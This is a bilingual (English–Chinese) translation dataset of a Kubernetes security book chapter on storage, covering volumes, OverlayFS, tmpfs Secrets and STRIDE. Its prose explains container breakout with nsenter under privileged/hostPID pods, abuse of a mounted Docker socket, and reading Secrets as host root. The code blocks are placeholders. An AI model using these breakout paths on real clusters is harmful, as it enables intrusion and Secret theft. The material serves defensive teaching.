- en: Chapter 6\. Storage
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 第六章。存储
- en: Your organization is valued by its data. That could be customer records and
    billing details, business secrets, or intellectual property. Customers and information
    collected over a company’s lifetime are valuable and the swarthy buccaneers of
    Captain Hashjack’s binary pirates are only paid in plunder.
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 您的组织以其数据为重要资产。这可能是客户记录和账单详细信息、商业机密或知识产权。客户和信息在公司生命周期内收集的价值重大，而Hashjack船长的二进制海盗们只为掠夺而来。
- en: Consider what identity fraudsters and nation states will pay for personal information.
    And if your data’s not valuable to them, you might get cryptolocked for a ransom,
    with the attacker likely to take the additional bonus of stealing your data while
    they’re in your systems.
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: 考虑身份欺诈者和国家主义者将为个人信息支付的费用。如果您的数据对他们没有价值，您可能会因勒索而被加密锁定，而攻击者可能在入侵您的系统时额外窃取您的数据。
- en: BCTL holds personal data on customers and employees like location, medical and
    financial records, secret information like credit card details, and delivery addresses.
    Your customers entrust these details to you, and you persist them on a filesystem,
    database, or network storage system (NFS, object store, NAS, etc.). For containers
    to access this data from Kubernetes pods they must use the network or, for larger
    data or lower latency requirements, use disks attached to the host system.
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: BCTL保存客户和员工的个人数据，如位置、医疗和财务记录，以及秘密信息，如信用卡详细信息和交付地址。您的客户信任您将这些详细信息保存在文件系统、数据库或网络存储系统（NFS、对象存储、NAS等）中。为了从Kubernetes
    Pod中访问这些数据，容器必须使用网络，或者出于数据量较大或较低延迟要求，使用附加到主机系统的磁盘。
- en: Mounting a host filesystem into a container breaks an isolation boundary with
    the host’s filesystem, and provides a potentially navigable route for an attacking
    pirate to consider.
  id: totrans-4
  prefs: []
  type: TYPE_NORMAL
  zh: 将主机文件系统挂载到容器中会打破与主机文件系统的隔离边界，并为攻击者提供潜在的可导航路径。
- en: When a container’s storage is accessible across a network, the most effective
    attacking strategy is to steal access keys and impersonate a legitimate application.
    Captain Hashjack may attack the application requesting keys (a container workload),
    a key store (the API server’s Secrets endpoint, or `etcd`), or the application’s
    host (the worker node). When Secrets are at rest they risk being accessed, modified,
    or stolen by a nefarious actor.
  id: totrans-5
  prefs: []
  type: TYPE_NORMAL
  zh: 当容器的存储可以通过网络访问时，最有效的攻击策略是窃取访问密钥并冒充合法应用程序。Hashjack船长可能会攻击请求密钥的应用程序（容器工作负载）、密钥存储（API服务器的Secrets端点或`etcd`）、或应用程序的主机（工作节点）。当Secrets处于静止状态时，它们面临被恶意行为者访问、修改或窃取的风险。
- en: In this chapter we explore what a filesystem is made of, and how to protect
    it from rascally attackers.
  id: totrans-6
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们探讨了文件系统的组成以及如何保护它免受恶意攻击者的侵害。
- en: Defaults
  id: totrans-7
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 默认设置
- en: Where can an application in Kubernetes store data? Each container in a pod has
    its own local filesystem, and temporary directories on it. This is perhaps */tmp*,
    or */dev/shm* for shared memory if the kernel supports it. The local filesystem
    is linked to the pod’s lifecycle, and is discarded when the pod is stopped.
  id: totrans-8
  prefs: []
  type: TYPE_NORMAL
  zh: Kubernetes中的应用程序可以在哪里存储数据？Pod中的每个容器都有自己的本地文件系统，以及在其上的临时目录。这可能是*/tmp*，或者如果内核支持的话可以是*/dev/shm*用于共享内存。本地文件系统与Pod的生命周期相关联，并在停止Pod时被丢弃。
- en: Containers in a pod do not share a mount namespace, which means they cannot
    see each other’s local filesystems. To share data, they can use a *shared volume*,
    a filesystem that’s mounted at a directory in the container’s local filesystem
    such as */mnt/foo*. This is also bound to the pod’s lifecycle, and is a `tmpfs`
    mount from the underlying host.
  id: totrans-9
  prefs: []
  type: TYPE_NORMAL
  zh: Pod中的容器不共享挂载命名空间，这意味着它们无法看到彼此的本地文件系统。为了共享数据，它们可以使用*共享卷*，这是一个文件系统，挂载到容器本地文件系统的目录中，例如*/mnt/foo*。这也与Pod的生命周期绑定，并且是从底层主机上的`tmpfs`挂载。
- en: To persist data beyond a pod’s lifespan, persistent volumes are used (see [“Volumes
    and Datastores”](#volumes-datastores)). They are configured and provided at the
    cluster level, and survive pod terminations.
  id: totrans-10
  prefs: []
  type: TYPE_NORMAL
  zh: 为了在Pod生命周期之外持久化数据，使用持久卷（参见[“卷和数据存储”](#volumes-datastores)）。它们在集群级别进行配置和提供，并在Pod终止后保留。
- en: Access to other pods’ persistent volumes is a danger to the confidentiality
    of sensitive workloads.
  id: totrans-11
  prefs: []
  type: TYPE_NORMAL
  zh: 访问其他Pod的持久卷对敏感工作负载的保密性构成威胁。
- en: Threat Model
  id: totrans-12
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 威胁模型
- en: The greatest concern to storage is your data being leaked. Attackers that can
    access data at rest may be able to extract sensitive customer and user information,
    attack other systems with the new knowledge they have found, or set up a cryptolocked
    ransom scenario.
  id: totrans-13
  prefs: []
  type: TYPE_NORMAL
- en: Tip
  id: totrans-14
  prefs:
  - PREF_H6
  type: TYPE_NORMAL
- en: Configure your API server to [encrypt Secrets at rest](https://oreil.ly/7KJmT)
    in `etcd`, and store Secrets in a Secrets store like KMS or Hashicorp Vault, encrypted
    files, or physically secured storage.
  id: totrans-15
  prefs: []
  type: TYPE_NORMAL
- en: Kubernetes storage uses volumes, which are a similar concept to Docker’s volumes.
    These volumes are used to persist state outside of a container, which by design
    can not persist files inside its own filesystem. Volumes are also used to share
    files between containers in a pod.
  id: totrans-16
  prefs: []
  type: TYPE_NORMAL
- en: Volumes appear as a directory inside the container, possibility including data
    if the storage behind the volume is already populated. How that directory is added
    by the container runtime is determined by the volume type. Many volume types are
    supported, including historically vulnerable protocols such as Network File System
    (NFS) and Internet Small Computer Systems Interface (iSCSI), as well as plug-ins
    such as `gitRepo` (an empty volume that runs a custom Git checkout step before
    mounting into the container).
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
- en: Warning
  id: totrans-18
  prefs:
  - PREF_H6
  type: TYPE_NORMAL
- en: The `gitRepo` volume plug-in required the `kubelet` to run `git` in a shell
    on the host, which exposed Kubernetes to attacks on Git such as [CVE-2017-1000117](https://oreil.ly/wPyPQ).
    While this required an attacker to have create pod permissions, the convenience
    of the feature was not enough to justify the increased attack surface, and the
    [volume type was deprecated](https://oreil.ly/SnFim) (there’s an [easy init container
    workaround](https://oreil.ly/bTZ6M)).
  id: totrans-19
  prefs: []
  type: TYPE_NORMAL
- en: Storage is an integration with underlying hardware, and so the threats depend
    upon how you have configured the storage. There are many types of storage drivers
    and you should choose one that makes sense for you and the team that will support
    it.
  id: totrans-20
  prefs: []
  type: TYPE_NORMAL
- en: You should care about your data when it is created and generated by an application,
    stored by persisting to storage, backed up by encrypting and moving to long-term
    storage media, retrieved again from storage to be shown to users, and deleted
    from short- and long-term storage, as shown in [Figure 6-1](#storage-data-lifecycle).
  id: totrans-21
  prefs: []
  type: TYPE_NORMAL
- en: '![Storage Data Lifecycle, http://people.cs.pitt.edu/~adamlee/pubs/2005/storagess05threat.pdf](Images/haku_0601.png)'
  id: totrans-22
  prefs: []
  type: TYPE_IMG
- en: Figure 6-1\. Storage data lifecycle
  id: totrans-23
  prefs:
  - PREF_H6
  type: TYPE_NORMAL
- en: 'The STRIDE threat modeling framework lends itself well to this practice. The
    STRIDE mnemonic stands for:'
  id: totrans-24
  prefs: []
  type: TYPE_NORMAL
- en: Spoofing (authenticity)
  id: totrans-25
  prefs: []
  type: TYPE_NORMAL
- en: If an attacker can change data, they can implant false data and user accounts.
  id: totrans-26
  prefs: []
  type: TYPE_NORMAL
- en: Tampering (integrity)
  id: totrans-27
  prefs: []
  type: TYPE_NORMAL
- en: Data under an attacker’s control can be manipulated, cryptolocked, or deleted.
  id: totrans-28
  prefs: []
  type: TYPE_NORMAL
- en: Repudiation (undeniable proof)
  id: totrans-29
  prefs: []
  type: TYPE_NORMAL
- en: Cryptographic signing of metadata about stored files ensures changed files cannot
    be validated, unless the attacker controls the signing key and regenerates the
    signed metadata.
  id: totrans-30
  prefs: []
  type: TYPE_NORMAL
- en: Information disclosure (confidentiality)
  id: totrans-31
  prefs: []
  type: TYPE_NORMAL
  zh: 信息泄露（机密性）
- en: Many systems leak sensitive information in debug and log data, and container
    mount points leak the host’s device and disk abstractions.
  id: totrans-32
  prefs: []
  type: TYPE_NORMAL
  zh: 许多系统在调试和日志数据中泄露敏感信息，而容器挂载点泄露主机的设备和磁盘抽象。
- en: Denial of service (availability)
  id: totrans-33
  prefs: []
  type: TYPE_NORMAL
  zh: 拒绝服务（可用性）
- en: Data can be removed, disk throughput or IOPS exhausted, and quotas or limits
    used up.
  id: totrans-34
  prefs: []
  type: TYPE_NORMAL
  zh: 数据可以被删除，磁盘吞吐量或 IOPS 耗尽，以及使用配额或限制。
- en: Elevation of privilege (authorization)
  id: totrans-35
  prefs: []
  type: TYPE_NORMAL
  zh: 提权（授权）
- en: External mounts may enable container breakout.
  id: totrans-36
  prefs: []
  type: TYPE_NORMAL
  zh: 外部挂载可能导致容器越界。
- en: Volumes and Datastores
  id: totrans-37
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 卷和数据存储
- en: In this section we review relevant storage concepts in Kubernetes.
  id: totrans-38
  prefs: []
  type: TYPE_NORMAL
  zh: 在本节中，我们回顾 Kubernetes 中相关的存储概念。
- en: Everything Is a Stream of Bytes
  id: totrans-39
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 一切都是字节流
- en: 'It’s often said that, in Linux, “everything is a file.” Well that’s not entirely
    true: everything can be treated “as a file” for reading or writing, using a file
    descriptor. Think of a file descriptor like a reference to a library book, in
    a section, on a shelf, pointing to a specific word on a certain page.'
  id: totrans-40
  prefs: []
  type: TYPE_NORMAL
  zh: 常常有人说，在 Linux 中，“一切皆为文件”。嗯，这并不完全正确：一切都可以被视为“文件”，用于读取或写入，使用文件描述符。把文件描述符想象成指向特定单词所在的页码和书架上的部分，就像对图书馆书籍的引用。
- en: 'There are seven types of file descriptors in Linux: a file, directory, character
    device, block device, pipe, symbolic link, and socket. That’s broadly covering
    files, hardware devices, virtual devices, memory, and networking.'
  id: totrans-41
  prefs: []
  type: TYPE_NORMAL
  zh: Linux 中有七种类型的文件描述符：文件、目录、字符设备、块设备、管道、符号链接和套接字。这广泛涵盖了文件、硬件设备、虚拟设备、内存和网络。
- en: When we have a file descriptor pointing to something useful, we can communicate
    using a stream of binary data flowing into it (when we’re writing to it), or out
    of it (when we’re reading from it).
  id: totrans-42
  prefs: []
  type: TYPE_NORMAL
  zh: 当我们有一个指向有用内容的文件描述符时，我们可以使用流入它的二进制数据流进行通信（当我们向其写入时），或者从中流出的二进制数据流进行通信（当我们从中读取时）。
- en: That goes for files, display drivers, sound cards, network interfaces, everything
    the system is connected to and aware of. So it’s more correct to say that in Linux
    “everything is a stream of bytes.”
  id: totrans-43
  prefs: []
  type: TYPE_NORMAL
  zh: 对于文件、显示驱动程序、声卡、网络接口以及系统连接和感知的一切来说，都是如此。因此，更正确的说法是在 Linux 中，“一切皆为字节流”。
- en: From within the humble container we are just running a standard Linux process,
    so all this is also true for a container. The container is “just Linux,” so your
    interaction with it is via a stream of bytes too.
  id: totrans-44
  prefs: []
  type: TYPE_NORMAL
  zh: 在谦卑的容器内部，我们只是在运行一个标准的 Linux 进程，因此所有这些对容器也适用。容器只是“Linux”，所以你与其的交互也是通过字节流进行的。
- en: Note
  id: totrans-45
  prefs:
  - PREF_H6
  type: TYPE_NORMAL
  zh: 注意
- en: Remember that “stateless containers” don’t want to persist important data to
    their local filesystem, but they still need inputs and outputs to be useful. State
    must exist; it’s safer to store it in a database or external system to achieve
    cloud native benefits like elastic scaling and resilience to failure.
  id: totrans-46
  prefs: []
  type: TYPE_NORMAL
  zh: 记住，“无状态容器”不希望将重要数据持久化到其本地文件系统，但它们仍然需要输入和输出才能发挥作用。状态必须存在；将其存储在数据库或外部系统中可以实现云原生的好处，如弹性扩展和对故障的韧性。
- en: All processes in a container will probably want to write data at some point
    in their lifecycle. That may be a read or write to the network, or writing variables
    to memory or a temporary file to disk, or reading information from the kernel
    like “what’s the most memory can I allocate?”
  id: totrans-47
  prefs: []
  type: TYPE_NORMAL
  zh: 容器中的所有进程可能在其生命周期的某个时刻都想要写入数据。这可能是向网络进行读写，或者将变量写入内存或临时文件到磁盘，或者从内核读取信息，比如“我可以分配的最大内存是多少？”
- en: When the container’s process wants to write data “to disk,” it uses the read/write
    layer on top of a container image. This layer is created at runtime, and doesn’t
    affect the rest of the immutable image. So the process first writes to its local
    filesystem inside the container, which is mounted from the host using OverlayFS.
    OverlayFS proxies the data the process is writing onto the host’s filesystem (e.g.,
    `ext4` or `ZFS`).
  id: totrans-48
  prefs: []
  type: TYPE_NORMAL
  zh: 当容器的进程想要将数据“写入磁盘”时，它使用容器镜像顶部的读写层。这个层在运行时创建，不会影响其余的不可变镜像。因此，该进程首先将数据写入容器内的本地文件系统，该文件系统是通过
    OverlayFS 从主机挂载的。OverlayFS 代理进程正在写入的数据，传输到主机的文件系统（例如，`ext4` 或 `ZFS`）。
- en: What’s a Filesystem?
  id: totrans-49
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 什么是文件系统？
- en: A filesystem is a way of ordering and retrieving data on a volume, like a filing
    system or library index.
  id: totrans-50
  prefs: []
  type: TYPE_NORMAL
  zh: 文件系统是在卷上对数据进行排序和检索的一种方式，类似于文件系统或图书馆索引。
- en: Linux uses a single virtual filesystem (VFS), mounted at the `/` mount point,
    to combine many other filesystems into one view. This is an abstraction to allow
    standardized filesystem access. The kernel uses VFS also as a filesystem interface
    for userspace programs.
  id: totrans-51
  prefs: []
  type: TYPE_NORMAL
- en: “Mounting” a filesystem creates a `dentry`, which represents a directory entry
    in the kernel’s `vfsmount` table. When we `cd` through a filesystem, we are interacting
    with instances of the `dentry` data structure to retrieve information about the
    files and directories we are viewing.
  id: totrans-52
  prefs: []
  type: TYPE_NORMAL
- en: Tip
  id: totrans-53
  prefs:
  - PREF_H6
  type: TYPE_NORMAL
- en: We explore the filesystem from an attacker’s perspective in [Appendix A](app01.xhtml#appendix-pod-attack).
  id: totrans-54
  prefs: []
  type: TYPE_NORMAL
- en: Virtual filesystems may be created on-demand, for example, `procfs` in */proc*
    and `sysfs` in */sys*, or as map onto other filesystems as VFS does.
  id: totrans-55
  prefs: []
  type: TYPE_NORMAL
- en: 'And each non-virtual filesystem must exist on a volume, which represents one
    or more media that store our data. The volume is what is presented to the user:
    both a single SSD with an `ext4` filesystem, or many spinning disks in a RAID
    or NAS storage array, may show up as a single volume and filesystem to the user.'
  id: totrans-56
  prefs: []
  type: TYPE_NORMAL
- en: We can physically read or write the data to a tangible “block device” like an
    SSD or a spinning disk, just like we use the pages and lines of text in a library
    book. These abstractions are shown in [Figure 6-2](#storage-volume-diagram).
  id: totrans-57
  prefs: []
  type: TYPE_NORMAL
- en: '![storage-volume-diagram](Images/haku_0602.png)'
  id: totrans-58
  prefs: []
  type: TYPE_IMG
- en: Figure 6-2\. Elements of a Linux volume
  id: totrans-59
  prefs:
  - PREF_H6
  type: TYPE_NORMAL
- en: Other types of virtual filesystems also don’t have a volume, such as `udev`,
    the “userspace /dev” filesystem that manages the device nodes in our */dev* directory—and
    `procfs`, which is usually mapped to */proc* and conveniently exposes Linux kernel
    internals through the filesystem.
  id: totrans-60
  prefs: []
  type: TYPE_NORMAL
- en: The filesystem is what the user interacts with, but the volume may be a local
    or remote disk, single disk, a distributed datastore across many disks, a virtual
    filesystem, or combinations of those things.
  id: totrans-61
  prefs: []
  type: TYPE_NORMAL
- en: Kubernetes allows us to mount a great variety of different volume types, but
    the volume abstraction is transparent to the end user. Due to the volume’s contract
    with the kernel, to the user viewing them each volumes appears as a filesystem.
  id: totrans-62
  prefs: []
  type: TYPE_NORMAL
- en: Container Volumes and Mounts
  id: totrans-63
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: 'When a container starts, the container runtime mounts filesystems into its
    mount namespace, as seen here in Docker:'
  id: totrans-64
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE0]'
  id: totrans-65
  prefs: []
  type: TYPE_PRE
  zh: '[PRE0]'
- en: Note that Docker appears to mount an */etc/hosts* file from the host, which
    in this case is a device mapper “special file.” There are also special filesystems,
    including a `/dev/mapper/` device mapper. There are more, including `proc`, `sysfs`,
    `udev`, and `cgroup2`, among others.
  id: totrans-66
  prefs: []
  type: TYPE_NORMAL
- en: OverlayFS
  id: totrans-67
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: OverlayFS as shown in [Figure 6-3](#storage-overlay-fs-diagram) creates a single
    filesystem by combining multiple read-only mount points. To write back to the
    filesystem, it uses a “copy on write” layer that sits on top of the other layers.
    This makes it particularly useful to containers, but also to bootable “live CDs”
    (that can be used to run Linux) and other read-only applications.
  id: totrans-68
  prefs: []
  type: TYPE_NORMAL
  zh: 如图 [6-3](#storage-overlay-fs-diagram) 所示的 OverlayFS 通过组合多个只读挂载点创建单个文件系统。为了向文件系统写回，它使用一个“写时复制”层，该层位于其他层之上。这使得它对容器特别有用，但也适用于可引导的“Live
    CD”（可用于运行 Linux）和其他只读应用程序。
- en: '![storage-overlay-fs-diagram](Images/haku_0603.png)'
  id: totrans-69
  prefs: []
  type: TYPE_IMG
  zh: '![storage-overlay-fs-diagram](Images/haku_0603.png)'
- en: 'Figure 6-3\. OverlayFS (source: [Kernel OverlayFS](https://oreil.ly/9mMA7))'
  id: totrans-70
  prefs:
  - PREF_H6
  type: TYPE_NORMAL
  zh: 图 6-3\. OverlayFS（来源：[内核 OverlayFS](https://oreil.ly/9mMA7)）
- en: 'The root of the container’s filesystem is provided by OverlayFS, and we can
    see that it leaks the host’s disk metadata and shows us the disk size and use.
    We can compare the rows by passing the */* and */etc/hosts* directories to `df`:'
  id: totrans-71
  prefs: []
  type: TYPE_NORMAL
  zh: 容器文件系统的根由 OverlayFS 提供，我们可以看到它泄漏了主机的磁盘元数据，并显示了磁盘的大小和使用情况。我们可以通过将 */* 和 */etc/hosts*
    目录传递给 `df` 来比较行：
- en: '[PRE1]'
  id: totrans-72
  prefs: []
  type: TYPE_PRE
  zh: '[PRE1]'
- en: 'Podman does the same, although it mounts */etc/hosts* from a different filesystem
    (note this uses `sudo` and is not rootless):'
  id: totrans-73
  prefs: []
  type: TYPE_NORMAL
  zh: Podman 也是如此，尽管它从不同的文件系统挂载了 */etc/hosts*（请注意这使用了 `sudo`，而不是无根）：
- en: '[PRE2]'
  id: totrans-74
  prefs: []
  type: TYPE_PRE
  zh: '[PRE2]'
- en: 'Notably rootless Podman uses a userspace filesystem, `fuse-overlayfs`, to avoid
    requesting root privileges when configuring the filesystem. This restricts the
    impact of a bug in the filesystem code—as it’s not owned by root, it’s not a potential
    avenue for privilege escalation:'
  id: totrans-75
  prefs: []
  type: TYPE_NORMAL
  zh: 值得注意的是，无根 Podman 使用用户空间文件系统 `fuse-overlayfs` 来配置文件系统时避免请求根权限。这限制了文件系统代码中的错误影响，因为它不是由根用户拥有，所以不是特权升级的潜在途径：
- en: '[PRE3]'
  id: totrans-76
  prefs: []
  type: TYPE_PRE
  zh: '[PRE3]'
- en: A volume must eventually be mapped to one or more physical disks if it persists
    data. Why is this important? Because it leaves a trail that an attacker can follow
    back to the host. The host can be attacked if there is a bug or misconfiguration
    in any of the software that interacts with that volume.
  id: totrans-77
  prefs: []
  type: TYPE_NORMAL
  zh: 如果卷持久化数据，最终必须将其映射到一个或多个物理磁盘上。这为什么重要？因为这留下了攻击者可以追溯到主机的痕迹。如果与该卷交互的任何软件存在错误或配置错误，主机可能会受到攻击。
- en: '![captain](Images/haku_0000.png)'
  id: totrans-78
  prefs: []
  type: TYPE_IMG
  zh: '![captain](Images/haku_0000.png)'
- en: Captain Hashjack may try to drop a script or binary onto the volume and then
    cause the host to execute it in a different process namespace. Or try to write
    a symlink that points to a legitimate file on the host, when read and resolved
    in the host’s mount namespace. If attacker-supplied input can be run “out of context”
    in a different namespace, container isolation can be broken.
  id: totrans-79
  prefs: []
  type: TYPE_NORMAL
  zh: Captain Hashjack 可能会尝试将脚本或二进制文件放入卷中，然后导致主机在不同的进程命名空间中执行它。或者尝试写入一个符号链接，该符号链接在主机的挂载命名空间中读取和解析时指向合法文件。如果攻击者提供的输入可以在不同的命名空间中“上下文外”运行，则可能破坏容器隔离。
- en: Containers give us the software-defined illusion of isolation from the host,
    but volumes are an obvious place for the abstraction to leak. Disks are historically
    error-prone and difficult to work with. The disk device on the host’s filesystem
    isn’t really hidden from the containerized process by the container runtime. Instead,
    the mount namespace has called `pivot_root` and we’re operating in a subset of
    the host’s filesystem.
  id: totrans-80
  prefs: []
  type: TYPE_NORMAL
  zh: 容器为我们提供了一种软件定义的隔离，使我们产生与主机隔离的错觉，但卷是一个显而易见的抽象泄漏的地方。磁盘在历史上容易出错且难以处理。主机文件系统上的磁盘设备并未通过容器运行时真正隐藏在容器化进程之外。相反，挂载命名空间调用了
    `pivot_root`，我们正在操作主机文件系统的一个子集。
- en: With an attacker mindset, seeing the host’s disk on */dev/mapper/tank-root*
    reminds us to probe the visible horizon and delve deeper.
  id: totrans-81
  prefs: []
  type: TYPE_NORMAL
  zh: 从攻击者的角度来看，看到主机的磁盘在 */dev/mapper/tank-root* 上提醒我们探索可见的地平线并深入探索。
- en: tmpfs
  id: totrans-82
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: '`tmpfs`'
- en: A filesystem allows a client to read or write data. But it doesn’t have to write
    the data when it’s told to, or even persist that data. The filesystem can do whatever
    it likes.
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: 文件系统允许客户端读取或写入数据。但当被告知写入数据时，它不一定要写入数据，或者甚至持久化该数据。文件系统可以随心所欲地做任何事情。
- en: Usually the filesystem’s data is stored at rest on a physical disk, or collection
    of disks. In some cases, like the temporary filesystem `tmpfs`, everything is
    in memory and data is not permanently stored at all.
  id: totrans-84
  prefs: []
  type: TYPE_NORMAL
  zh: 通常文件系统的数据会存储在物理磁盘或磁盘集合上。在某些情况下，如临时文件系统 `tmpfs`，所有数据都在内存中，数据根本不会永久存储。
- en: Note
  id: totrans-85
  prefs:
  - PREF_H6
  type: TYPE_NORMAL
  zh: 注意
- en: '`tmpfs` succeeded `ramfs` as Linux’s preferred temporary filesystem. It makes
    a preallocated portion of the host’s memory available for filesystem operations
    by creating a virtual filesystem in memory. This may be especially useful for
    scripts and data-intensive filesystem processes.'
  id: totrans-86
  prefs: []
  type: TYPE_NORMAL
  zh: '`tmpfs`取代了`ramfs`成为Linux首选的临时文件系统。它通过在内存中创建一个虚拟文件系统，使主机内存的预分配部分可用于文件系统操作。这对于脚本和数据密集型文件系统进程可能特别有用。'
- en: Containers use `tmpfs` filesystems to hide host filesystem paths. This is called
    “masking,” which is anything that hides a path or file from a user.
  id: totrans-87
  prefs: []
  type: TYPE_NORMAL
  zh: 容器使用`tmpfs`文件系统来隐藏主机文件系统路径。这被称为“掩盖”，即隐藏路径或文件对用户来说。
- en: 'Kubernetes uses `tmpfs` too, to inject configuration into a container. This
    is a “12 factor app” principle: configuration shouldn’t be inside a container;
    it should be added at runtime in the expectation that it’ll differ across environments.'
  id: totrans-88
  prefs: []
  type: TYPE_NORMAL
  zh: Kubernetes也使用`tmpfs`将配置注入到容器中。这是“12因素应用”原则：配置不应该在容器内部；它应该在运行时添加，以期望在不同环境中有所不同。
- en: As with all filesystem mounts, the root user on the host can see everything.
    It needs to be able to debug the machine, so this is a usual and expected security
    boundary.
  id: totrans-89
  prefs: []
  type: TYPE_NORMAL
  zh: 与所有文件系统挂载一样，主机上的root用户可以看到一切。它需要能够调试机器，因此这是一个通常且预期的安全边界。
- en: Kubernetes can mount Secret files into individual containers, and it does this
    using `tmpfs`. Every container Secret, like a service account token, has a `tmpfs`
    mount from the host to the container with the Secret in it.
  id: totrans-90
  prefs: []
  type: TYPE_NORMAL
  zh: Kubernetes可以将Secret文件挂载到各个容器中，并使用`tmpfs`来实现。每个容器Secret，如服务帐户令牌，都有一个从主机到包含Secret的容器的`tmpfs`挂载。
- en: Other mount namespaces shield the Secrets from other containers, but as the
    host creates and manages all these filesystems the host root user can read all
    the Secrets mounted by a `kubelet` for its hosted pods.
  id: totrans-91
  prefs: []
  type: TYPE_NORMAL
  zh: 其他挂载命名空间将Secrets与其他容器隔离，但由于主机创建和管理所有这些文件系统，主机root用户可以读取由`kubelet`为其托管的pod挂载的所有Secrets。
- en: 'As root on the host, we can see all the Secrets our local `kubelet` has mounted
    for the pods running on the host using the `mount` command:'
  id: totrans-92
  prefs: []
  type: TYPE_NORMAL
  zh: 作为主机上的root用户，我们可以使用`mount`命令查看主机上运行的pod所挂载的所有Secrets：
- en: '[PRE4]'
  id: totrans-93
  prefs: []
  type: TYPE_PRE
  zh: '[PRE4]'
- en: 'Each mount point is a self-contained filesystem, and so Secrets are stored
    in files on each filesystem. This utilizes the Linux permissions model to ensure
    confidentiality. Only the process in the container is authorized to read the Secrets
    mounted into it, and as ever root is omniscient and can see, and do, almost anything:'
  id: totrans-94
  prefs: []
  type: TYPE_NORMAL
  zh: 每个挂载点都是一个独立的文件系统，因此Secrets被存储在每个文件系统中的文件中。这利用了Linux权限模型来确保机密性。只有容器中的进程被授权读取挂载到其中的Secrets，而且像往常一样，root是全知全能的，可以看到并做几乎任何事情：
- en: '[PRE5]'
  id: totrans-95
  prefs: []
  type: TYPE_PRE
  zh: '[PRE5]'
- en: Volume Mount Breaks Container Isolation
  id: totrans-96
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 卷挂载破坏容器隔离性
- en: We consider anything external introduced into the container, or the relaxing
    of any security controls, as an increased risk to a container’s security. The
    mount namespace is frequently used to mount read-only filesystems into a pod,
    and for safety’s sake should always be read-only when possible.
  id: totrans-97
  prefs: []
  type: TYPE_NORMAL
  zh: 我们认为任何引入到容器中的外部内容，或者任何安全控制的放松，都会增加容器安全性的风险。挂载命名空间经常用于将只读文件系统挂载到pod中，出于安全考虑，应尽可能始终保持只读。
- en: If a Docker server’s client-facing socket is mounted into a container as read-write,
    the container is able to use the Docker client to start a new privileged container
    on the same host.
  id: totrans-98
  prefs: []
  type: TYPE_NORMAL
  zh: 如果将Docker服务器的客户端面向的套接字挂载到容器中作为读写，那么容器就能够使用Docker客户端在同一主机上启动一个新的特权容器。
- en: The privileged mode removes all security features and shares the host’s namespaces
    and devices. So an attacker in a privileged container is now able to break out
    of the container.
  id: totrans-99
  prefs: []
  type: TYPE_NORMAL
  zh: 特权模式移除了所有安全功能，并共享主机的命名空间和设备。因此，在特权容器中的攻击者现在能够打破容器的限制。
- en: The simplest way of doing this is with the namespace manipulation tool `nsenter`,
    which will either enter existing namespaces, or start a process in entirely new
    namespaces.
  id: totrans-100
  prefs: []
  type: TYPE_NORMAL
  zh: 最简单的方法是使用命名空间操作工具`nsenter`，它将进入现有的命名空间，或在全新的命名空间中启动一个进程。
- en: 'This command is very similar to `docker exec`: it moves a current or new process
    into the specified namespace or namespaces. This has the effect of transporting
    the user of the shell session between different namespace environments.'
  id: totrans-101
  prefs: []
  type: TYPE_NORMAL
  zh: 这个命令与`docker exec`非常相似：它将当前或新的进程移动到指定的命名空间或多个命名空间中。这样做的效果是在不同的命名空间环境之间传输shell会话的用户。
- en: Note
  id: totrans-102
  prefs:
  - PREF_H6
  type: TYPE_NORMAL
  zh: 注意
- en: '`nsenter` is considered a debugging tool and avoids entering `cgroups` in order
    to evade resource limits. Kubernetes and `docker exec` respect these limits, as
    resource exhaustion may DOS the entire node server.'
  id: totrans-103
  prefs: []
  type: TYPE_NORMAL
- en: 'Here we will start Bash in the mount namespace of PID 1\. It is critical to
    security, as with */proc/self/exe*, to understand which namespace’s */proc* filesystem
    is mounted on the local filesystem. Anything mounted from the host into the container
    gives us an opportunity to attack it:'
  id: totrans-104
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE6]'
  id: totrans-105
  prefs: []
  type: TYPE_PRE
  zh: '[PRE6]'
- en: This command starts Bash in the mount namespace of PID 1\. If a command is omitted,
    `/bin/sh` is the default.
  id: totrans-106
  prefs: []
  type: TYPE_NORMAL
- en: If the calling process is in a container with its own mount namespace, the command
    starts Bash in this same container namespace and not the host’s.
  id: totrans-107
  prefs: []
  type: TYPE_NORMAL
- en: However, if the calling process is sharing the host’s PID namespace, this command
    will exploit the */proc/1/ns/mnt* link. Sharing the host’s PID namespace shows
    the host’s */proc* inside the container’s */proc*, showing the same process as
    previously with the addition of every other process in the target namespace.
  id: totrans-108
  prefs: []
  type: TYPE_NORMAL
- en: '[Duffie Cooley](https://oreil.ly/KijgS) and [Ian Coldwater](https://oreil.ly/imCJW)
    pulled the canonical offensive Kubernetes one-liner together the first time they
    met (see [Figure 6-4](#tweet-duffie-nsenter)).'
  id: totrans-109
  prefs: []
  type: TYPE_NORMAL
- en: '![haku 0604](Images/haku_0604.png)'
  id: totrans-110
  prefs: []
  type: TYPE_IMG
- en: Figure 6-4\. Duffie Cooley’s powerful wizardry, escaping containers with `nsenter`
    in Kubernetes clusters that allow privileged containers and hostPID
  id: totrans-111
  prefs:
  - PREF_H6
  type: TYPE_NORMAL
- en: 'Let’s have a closer look:'
  id: totrans-112
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE7]'
  id: totrans-113
  prefs: []
  type: TYPE_PRE
  zh: '[PRE7]'
- en: '[![1](Images/1.png)](#co_storage_CO1-1)'
  id: totrans-114
  prefs: []
  type: TYPE_NORMAL
- en: Run the `nsenter` one-liner.
  id: totrans-115
  prefs: []
